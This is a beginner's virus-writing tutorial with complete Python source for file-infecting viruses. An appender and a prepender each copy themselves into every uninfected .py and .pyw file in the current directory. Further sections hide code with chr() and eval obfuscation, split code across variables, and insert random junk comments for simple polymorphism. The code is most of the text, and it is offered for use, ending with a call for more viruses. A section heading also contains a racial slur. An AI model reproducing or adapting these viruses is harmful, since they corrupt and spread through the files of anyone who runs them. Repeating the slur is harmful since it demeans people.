I warn you: This is the first tutorial i have ever written, so i guess it will be a bit shit!  

Python? 

Python is a freeware powerful interpreted programming language available for most operating systems. 
It is object-oriented, interactive, portable and easy to learn. It is also popular as a CGI scripting 
language, as its capabilities compare favorably with those of Perl (Not that i code perl) 
It can be interpreted in a number of operating systems, this makes very good idea for future viruses  
So erm, lets go!  


Python Appender Virus: 

Here i will show you a small appender. Appenders are a type of standard file infection along 
with prepender and the lame overwriters (that no one really likes!) Damnit :p 
Appending means to write the virus code after the normal code, therefore, the virus is run 
after the hostcode. 

<><><><><><><><><><><><><><Start Code><><><><><><><><><><><><><><! 

Code: 
Code: 
import glob #! 
from string import * #! 
Files = glob.glob("*.py") + glob.glob("*.pyw") #! 
for Files in Files: #! 
   vCode = open(__file__, 'r') #! 
   victim = open (Files, 'r') #! 
   readvictim = victim.read() #! 
   if find(readvictim, "-=::Vort3x::=-") == -1: #! 
       victim = open(Files, 'a') #! 
       for code in vCode.readlines(): #! 
            if ("#!") in code: #! 
                vCode.close() #! 
                mycode=(chr(10)+code) #! 
                victim.write(mycode) #! 



<><><><><><><><><><><><><><><End Code><><><><><><><><><><><><><><! 

Here is how it works: 

1: Searched for files (py / pyw) in current directory 
2: Looks inside those files to find the infection marker. Note: this virus has 2 markers, ill explain later  
3: Finds its own code 
4: Opens the uninfected files and writes its code to the end of the normal code. 
5: Closes all open files.. finished! 

Why it has 2 markers: Well, the ones you notice the most are the virus code markers, we use these to 
know what code to infect other files with. The virus will only copy the code that has "#!" at the end of 
each line, understand? there are other ways of doing this but blah it works  
Then we have the infection marker "-=::Vort3x::=-" this is so we can see if the file has already been infected. 
If we dont use any infection marker, bad things will happen!!  Such as your virus re-appending to files. :O 
Then you end up with HUGE files, growing in size each time its executed! 


Python Prepender Virus 

Prependers are again standard infection types. All this does is add its code to the top of the 
infected file  

<><><><><><><><><><><><><><Start Code><><><><><><><><><><><><><><! 

Code: 
Code: 
import glob 
from string import * 
x = glob.glob("*.py") + glob.glob("*.pyw") 
for x in x: 
    host = open(x, 'r') 
    hostcode = host.read() 
    if find(hostcode, "-=::VortX::=-") == -1: 
        host = open(x, 'w') 
        myself = open(__file__, 'r') 
        a = myself.read() 
        num=50*2+5 
        a = a[:find(a, "#VORTX")+num] 
        mybody=a+chr(10)+hostcode 
        myself.close() 
        host.write(mybody) 
#VORTX 


<><><><><><><><><><><><><><End Code><><><><><><><><><><><><><><! 

So: 
-We seach for files 
-Open the files and read its contents 
-Store the code in a variable 
-Open Myself (yahahaha Confused ) 
-Read my body and store in a variable 
-Open the file(s) that havnt been infected (for writing) they are the files that dont have "-=::VortX::=-" inside!  
-Cound number of characters long the virus code it upto the virus marker "#VORTX" 
-Store everything into a new variable, write the virus code to the file and append the normal code to the end of the virus code. 

Hmm hope that makes sense? its really easy.. think about it, play with the code  

Virus As ASCII Numbers: 

This method is easy and common in scripting languages. We change the code to its ASCII numbers. 
Erm apart from spending hours encrypting it.. its easy  Thats why its a good idea to make your own 
encryption tool  Made mine in VB, it saved time!!!! Very Happy but i think there is something like 
that on VX Heaven, if you cant make your own? but you will need to play with the code a bit to make 
it work in python. 

<><><><><><><><><><><><><><Start Code><><><><><><><><><><><><><><! 
Code: 

Code: 
eval(chr(114)+chr(97)+chr(119)+chr(95)+chr(105)+chr(110)+chr(112)+chr(117)+chr(116)+chr(40)+chr(34)+chr(73)+chr(109)+chr(32)+chr(86)+chr(111)+chr(114)+chr(116)+chr(88)+chr(44)+chr(32)+chr(87)+chr(101)+chr(108)+chr(99)+chr(111)+chr(109)+chr(101)+chr(32)+chr(116)+chr(111)+chr(32)+chr(109)+chr(121)+chr(32)+chr(119)+chr(111)+chr(114)+chr(108)+chr(100)+chr(33)+chr(34)+chr(41)) 


<><><><><><><><><><><><><><End Code><><><><><><><><><><><><><><! 

This code has the "Raw_input" command (used for asking user input) but "print" neva seems to 
work :/ Anywayz, its impossible to read this or know what it is unless you decrypt it all. 
the code uses a command called "eval" eval is a function which evaluates a string as though it 
were an expression and returns a result, we use it to run commands... this is used alot in encryption! 



Using Variables To Encrypt: 

Setting your own variable for each character (set of characters) 

<><><><><><><><><><><><><><Start Code><><><><><><><><><><><><><><! 

Code: 
Code: 
aa="pu" 
bb="aw" 
cc="t(" 
dd="r" 
ee="_in" 
ff="he" 
hq="erz" 
js=chr(34) 
gg="ll" 
yu="VX" 
hh="o"+chr(32) 
eval(dd+bb+ee+aa+cc+js+ff+gg+hh+yu+hq+js+')') 



<><><><><><><><><><><><><><End Code><><><><><><><><><><><><><><! 

Nothing much to say about that, its another encryption. 


Adding Trash: 

It adds random trash code in each line at a random lengh. Hmm i hate to say it but 
this code is pretty lame! it does not add its code in random area's  
But i think it gives a good idea of poly in python!  

<><><><><><><><><><><><><><Start Code><><><><><><><><><><><><><><! 

Code: 
Code: 
import glob #! 
import random #! 
from string import * #! 
trash = 'abcdefghijklmnopqrstuvwxyz' #! 
lengh = random.randrange(10, 20) #! 
Files = glob.glob("*.py") + glob.glob("*.pyw") #! 
for Files in Files: #! 
  vCode = open(__file__, 'r') #! 
  victim = open (Files, 'r') #! 
  readvictim = victim.read() #! 
  if find(readvictim, "-=::Vort3x::=-") == -1: #! 
      victim = open(Files, 'a') #! 
      for code in vCode.readlines(): #! 
           if ("#!") in code: #! 
               vCode.close() #! 
               mycode=(chr(10)+code) #! 
               victim.write("#"+join(random.sample(trash, lengh))+mycode) #! 

<><><><><><><><><><><><><><End Code><><><><><><><><><><><><><><! 

Yokay, ill explain  

First we import the "Random module" 
Then we set some random characters / numbers, into the "Trash" variable 
Then we set the lengh of the random trash (the lengh is also random for 10 - 20) 
Then we write our virus code to the host. 
Then we put a comment marker for the trash (bcoz trash is not supposed to be executed!) we space each line in the infected file and add random characters 
a random lengh from the trash variable into that line, please understand! its not hard  

Its very very easy i think! It helps if you learn a little python first befor you start bitching about not understanding the code  because im not 
about to answer emails asking me what each and every line does! im busy with trying to get into a college :/ 

snizzle p00p niggar: 

Hmmm i have been typing this out for almost 2 hours, so, i dont really want to say much more  
But, i think Python is a cool language, there is a lot to be done yet. I'd like to see more python viruses lazy arse bastards! I should have done more, but only today i started learning python again after almost 3 months! :p 
Please tell me about any bugs in my code (yea yea!)
